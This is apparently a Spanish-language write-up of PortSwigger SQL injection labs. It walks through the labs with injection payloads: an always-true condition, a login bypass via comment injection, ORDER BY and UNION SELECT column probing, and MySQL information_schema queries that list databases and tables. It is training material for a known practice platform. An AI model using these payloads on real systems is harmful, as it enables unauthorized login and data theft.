<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/sqlinjection-banner.jpg">

# ¿Qué es SQL Injection?

AQL Injection es una vulnerabilidad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos, gracias a esta vulnerabilidad un atacante puede llegar a ver datos que normalmente no son publicos para terceros. Esto puede incluir datos pertenecientes a otros usuarios o cualquier otro dato sobre la aplicación.

Aquí estarán las resoluciones de los laboratorios de [PortSwigger](https://portswigger.net/web-security/sql-injection)

# 1. Lab: Vulnerability in WHERE clause allowing retrieval of hidden data

> https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Al entrar el laboratorio veremos esto:
<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab1-sqli.png">

Tenemos varios botones, que al hacerles clic modifican la URL, vamos a darle por ejemplo a ```"Gifts"```

Luego de hacerlo, en la URL se agregara ```/filter?category=Gifts```

Podemos pensar que por detrás la aplicación web está realizando la siguiente consulta a la base de datos:

```SELECT * FROM products WHERE category = 'Gifts' AND released = 1```

Esta query SQL, lo que está haciendo es solicitar todos los datos, dentro de la tabla ```products```, mientras que con el ```WHERE``` filtra por la columna ```Gifts```, y con ```AND released = 1``` se seleccionarán los productos que ya han sido lanzados al mercado.

Para poder explotar esto, podemos intentar inyectar nuestra query SQL en el campo "Gifts", poniendo ```' or 1=1--```

Con la primer ```'``` lo que hacemos es cerrar la primer query, es decir, en vez de estar poniendo 

```SELECT * FROM products WHERE category = 'Gifts'```

Estamos poniendo 

```SELECT * FROM products WHERE category = 'Gifts' or 1=1--'```

luego con el ```or 1=1``` estamos haciendo una comparación que es igual a ```True```, ya que 1 es igual a 1, y para finalizar, con los 2 guiones ```--``` estamos comentando el resto de la query.

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/sqli1.png">

# 2. Lab: Vulnerability allowing login bypass

> https://portswigger.net/web-security/sql-injection/lab-login-bypass

Al entrar a este laboratorio, veremos que hay un apartado llamado ```My account```, el cual al hacerle clic nos redirige a un formulario de inicio de sesión

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab2-sqli.png">

Supongamos que el servidor tramita esta query sql

```SELECT * FROM users WHERE username = 'username' AND password = 'password'```

Podemos bypassear este formulario de inicio de sesión haciendo uso de la anterior query

-  ```'or 1=1--```

Ya que si ponemos como usuario ```'or 1=1--``` la query que enviara el servidor a la base de datos será la siguiente

```SELECT * FROM users WHERE username = '' or 1=1-- '```

Esto sera ignorado ➜ AND password = 'password', gracias a los ```--```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab2-sqli-result.png">

# 3. Lab: UNION attack, determining the number of columns

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

## ¿Qué son los UNION Attack?

Cuando una aplicación es vulnerable a la inyección SQL y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación, el UNION es la palabra clave se puede utilizar para recuperar datos de otras tablas dentro de la base de datos.

Bueno, para poder llevar a cabo este ataque, primero debemos saber la cantidad de columnas que contiene la tabla, esto lo podemos averiguar usando la query ```order by```

El primer método consiste en inyectar una serie de ```ORDER BY <NUMERO>``` e ir incrementando el índice de columna especificado hasta que se produzca un error. 
- ```' ORDER BY 1--```
- ```' ORDER BY 2--```
- ```' ORDER BY 3--```

 Cuando el índice de columna especificado excede el número de columnas reales en el conjunto de resultados, la base de datos devuelve un error, como:
 
 ```The ORDER BY position number 3 is out of range of the number of items in the select list.```
 
 No necesariamente tiene que devolver este error, también puede devolver un error en la respuesta de la base de datos a la web, o un error de código 500 (por ejemplo)
 
 El segundo método consiste en enviar una serie de UNION SELECT especificando un número diferente de valores nulos
 
 - ```' UNION SELECT NULL--```
 - ```' UNION SELECT NULL,NULL--```
 - ```' UNION SELECT NULL,NULL,NULL--```

Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:

```All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.```

O como en el anterior caso, también puede devolver un error en la respuesta de la base de datos a la web o un código de estado no exitoso

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab3-null-error.png">

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab3-null-exito.png">

Como vemos al poner la query ```' UNION SELECT NULL,NULL,NULL--``` no devuelve ningún error, por ende podemos saber que hay 3 columnas.

# 4. Lab: UNION attack, finding a column containing text

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

En este laboratorio tenemos que ingresar una cadena de caracteres en la representación de los valores nulos, saber cuál es el campo inyectable, es importante para poder saber en qué columna debemos inyectar las query SQL, esto es ir probando campo por campo para saber en cuál es el campo que podemos usar para la explotación.

- ```' UNION SELECT 'a',NULL,NULL--```
- ```' UNION SELECT NULL,'a',NULL--```
- ```' UNION SELECT NULL,NULL,'a'--```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab-resolve.png">

# 5. Lab: UNION attack, retrieving data from other tables

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

Este laboratorio está muy bueno, ya que debemos iniciar sesión como el usuario administrador, pero su credencial la debemos sacar mediante inyecciones SQL

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab5-schemaName.png">

### Formas de enumerar las bases de datos (mysql)

- ```SELECT schema_name FROM information_schema.schemata``` ➜ Esta es la forma basica de listar las bases de datos.
- ```SELECT group_concat(schema_name) FROM information_schema.schemata``` ➜ Nos lista todas las bases de datos separadas por ",".
- ```SELECT schema_name FROM information_schema.schemata LIMIT 0,1``` ➜ Nos devuelve el nombre de la primera base de datos disponible en el servidor MySQL, si lo ponemos en ```LIMIT 1,1``` Nos devolverá el nombre de la segunda base de dato, y así sucesivamente.
- ```SELECT table_schema FROM information_schema.tables GROUP BY table_schema``` ➜ Esta consulta devuelve una lista de todas las bases de datos que contienen tablas.
- ```SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME NOT IN ('information_schema', 'mysql', 'performance_schema')```  Esta consulta devuelve una lista de todas las bases de datos disponibles en el servidor excepto las bases de datos del sistema predeterminadas.

### Formas de enumerar las tablas (mysql)

-  ```SELECT table_name FROM information_schema.tables WHERE table_schema = 'nombre_de_la_base_de_datos'``` ➜ Esta consulta devuelve una lista de todas las tablas disponibles en la base de datos especificada.
-  ```SELECT distinct table_name FROM information_schema.columns WHERE table_schema = 'nombre_de_la_base_de_datos'``` ➜ Esta consulta devuelve una lista de todas las tablas disponibles en la base de datos especificada, filtrando por las columnas existentes.
-  ```SELECT table_name FROM information_schema.tables``` ➜ Esta consulta devuelve todas las tablas de todas las bases de datos.
